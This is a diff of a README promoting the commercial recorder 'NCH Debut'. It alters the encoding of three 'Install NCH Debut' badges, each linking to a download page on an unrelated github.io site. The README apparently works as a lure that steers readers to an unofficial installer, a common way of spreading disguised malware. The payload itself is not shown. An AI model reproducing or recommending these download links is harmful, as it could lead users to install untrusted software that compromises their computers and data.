@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH Debut](https://img.shields.io/badge/⬇_Install_NCH%20Debut-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Debut](https://img.shields.io/badge/⬇_Install_NCH+Debut-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH Debut is a screen capture and recording software for Windows and macOS that 
 
 <div align="center">
 
-[![⬇ Install NCH Debut](https://img.shields.io/badge/⬇_Install_NCH%20Debut-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Debut](https://img.shields.io/badge/⬇_Install_NCH+Debut-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH Debut is a screen capture and recording software for Windows and macOS that 
 
 <div align="center">
 
-[![⬇ Install NCH Debut](https://img.shields.io/badge/⬇_Install_NCH%20Debut-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Debut](https://img.shields.io/badge/⬇_Install_NCH+Debut-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
